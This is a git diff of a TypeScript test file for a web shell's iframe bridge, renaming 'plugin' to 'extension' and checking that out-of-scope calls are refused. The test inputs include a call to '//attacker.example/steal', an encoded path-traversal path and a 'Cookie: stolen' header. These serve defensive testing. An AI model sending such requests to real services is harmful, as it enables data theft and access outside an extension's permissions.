@@ -1,6 +1,6 @@
 // SPDX-FileCopyrightText: 2026 Massimo Antonini
 // SPDX-License-Identifier: MPL-2.0
-import { EventBus, type FrontendBridge, type FrontendPlugin } from '@mosaikit/sdk';
+import { EventBus, type FrontendBridge, type FrontendExtension } from '@mosaikit/sdk';
 import { describe, expect, it, vi } from 'vitest';
 import type { ShellMessage } from '../src/bridge-protocol.js';
 import { ShellBridge } from '../src/shell-bridge.js';
@@ -9,19 +9,19 @@ const declared: FrontendBridge = {
   publishes: ['boxed.saved', 'boxed.status.*'],
   subscribes: ['maps.*', 'shell.theme.changed'],
   services: ['api'],
-  api: '/api/v1/p/boxed/',
+  api: '/api/v1/ext/boxed/',
 };
 
-const plugin: FrontendPlugin = {
+const extension: FrontendExtension = {
   id: 'dev.example.boxed',
   version: '1.0.0',
-  entry: '/api/v1/plugin-assets/dev.example.boxed/web/index.js',
+  entry: '/api/v1/extension-assets/dev.example.boxed/web/index.js',
   isolation: 'iframe',
   bridge: declared,
   contributions: [],
 };
 
-function setup(target: FrontendPlugin = plugin) {
+function setup(target: FrontendExtension = extension) {
   const events = new EventBus();
   const sent: ShellMessage[] = [];
   const warnings: string[] = [];
@@ -95,7 +95,7 @@ describe('ShellBridge (MK-014)', () => {
     expect(sent).toEqual([]);
   });
 
-  it('calls the API of the plugin with the credentials of the shell', async () => {
+  it('calls the API of the extension with the credentials of the shell', async () => {
     const { bridge, sent, request } = setup();
 
     bridge.handle({
@@ -114,17 +114,17 @@ describe('ShellBridge (MK-014)', () => {
       id: 2,
       service: 'api',
       method: 'GET',
-      path: '/api/v1/p/boxed/notes?limit=5',
+      path: '/api/v1/ext/boxed/notes?limit=5',
       headers: {},
     });
     await settle();
 
     expect(request).toHaveBeenCalledTimes(2);
     expect(request.mock.calls[0]).toEqual([
-      '/api/v1/p/boxed/notes',
+      '/api/v1/ext/boxed/notes',
       { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"text":"hi"}' },
     ]);
-    expect(request.mock.calls[1]?.[0]).toBe('/api/v1/p/boxed/notes?limit=5');
+    expect(request.mock.calls[1]?.[0]).toBe('/api/v1/ext/boxed/notes?limit=5');
     expect(sent[0]).toMatchObject({
       type: 'result',
       id: 1,
@@ -133,7 +133,7 @@ describe('ShellBridge (MK-014)', () => {
     });
   });
 
-  it('refuses calls outside the API of the plugin or to undeclared services', async () => {
+  it('refuses calls outside the API of the extension or to undeclared services', async () => {
     const { bridge, sent, request } = setup();
     const call = (id: number, service: string, method: string, path: string) =>
       bridge.handle({ mk: 1, type: 'call', id, service, method, path, headers: {} });
@@ -143,25 +143,25 @@ describe('ShellBridge (MK-014)', () => {
     call(3, 'api', 'GET', '//attacker.example/steal');
     call(4, 'api', 'TRACE', 'notes');
     call(5, 'storage', 'GET', 'notes');
-    call(6, 'api', 'GET', '/api/v1/p/boxed/..%2F..%2Forganizations');
+    call(6, 'api', 'GET', '/api/v1/ext/boxed/..%2F..%2Forganizations');
     await settle();
 
     expect(request).not.toHaveBeenCalled();
     expect(sent.map((message) => message.type === 'result' && message.error)).toEqual([
-      expect.stringContaining('only the API of the plugin'),
-      expect.stringContaining('only the API of the plugin'),
-      expect.stringContaining('only the API of the plugin'),
+      expect.stringContaining('only the API of the extension'),
+      expect.stringContaining('only the API of the extension'),
+      expect.stringContaining('only the API of the extension'),
       expect.stringContaining('method TRACE'),
       expect.stringContaining("service 'storage'"),
-      expect.stringContaining('only the API of the plugin'),
+      expect.stringContaining('only the API of the extension'),
     ]);
   });
 
-  it('lets nothing through for a plugin without a bridge or without an API', async () => {
-    const bare: FrontendPlugin = {
-      id: plugin.id,
-      version: plugin.version,
-      entry: plugin.entry,
+  it('lets nothing through for an extension without a bridge or without an API', async () => {
+    const bare: FrontendExtension = {
+      id: extension.id,
+      version: extension.version,
+      entry: extension.entry,
       isolation: 'iframe',
       contributions: [],
     };
@@ -177,7 +177,7 @@ describe('ShellBridge (MK-014)', () => {
       headers: {},
     });
 
-    const noApi = setup({ ...plugin, bridge: { ...declared, api: null } });
+    const noApi = setup({ ...extension, bridge: { ...declared, api: null } });
     noApi.bridge.handle({
       mk: 1,
       type: 'call',
@@ -194,7 +194,7 @@ describe('ShellBridge (MK-014)', () => {
     expect(sent[0]).toMatchObject({ id: 1 });
     expect(sent[0]?.type === 'result' ? sent[0].error : undefined).toContain("service 'api'");
     expect(noApi.sent).toEqual([
-      expect.objectContaining({ id: 2, error: 'the plugin has no backend API' }),
+      expect.objectContaining({ id: 2, error: 'the extension has no backend API' }),
     ]);
   });
 
@@ -202,7 +202,7 @@ describe('ShellBridge (MK-014)', () => {
     const events = new EventBus();
     const sent: ShellMessage[] = [];
     const bridge = new ShellBridge(
-      plugin,
+      extension,
       events,
       () => Promise.reject(new Error('offline')),
       (m) => sent.push(m),
@@ -226,7 +226,7 @@ describe('ShellBridge (MK-014)', () => {
     const events = new EventBus();
     const warnings: string[] = [];
     const bridge = new ShellBridge(
-      { ...plugin, bridge: { ...declared, publishes: ['boxed.*'], subscribes: ['maps.*'] } },
+      { ...extension, bridge: { ...declared, publishes: ['boxed.*'], subscribes: ['maps.*'] } },
       events,
       () => Promise.resolve(new Response()),
       () => {
@@ -247,9 +247,9 @@ describe('ShellBridge (MK-014)', () => {
     ]);
   });
 
-  it('calls the collections of a plugin that declared the data service (ADR-0031)', async () => {
+  it('calls the collections of an extension that declared the data service (ADR-0031)', async () => {
     const { bridge, sent, request } = setup({
-      ...plugin,
+      ...extension,
       bridge: {
         publishes: [],
         subscribes: [],
@@ -262,7 +262,7 @@ describe('ShellBridge (MK-014)', () => {
 
     call(1, '/api/v1/data/dev.example.boxed/items/42', { 'If-Match': '3', Cookie: 'stolen' });
     call(2, '/api/v1/data/dev.example.other/items');
-    call(3, '/api/v1/p/boxed/notes');
+    call(3, '/api/v1/ext/boxed/notes');
     await settle();
 
     expect(request).toHaveBeenCalledTimes(1);
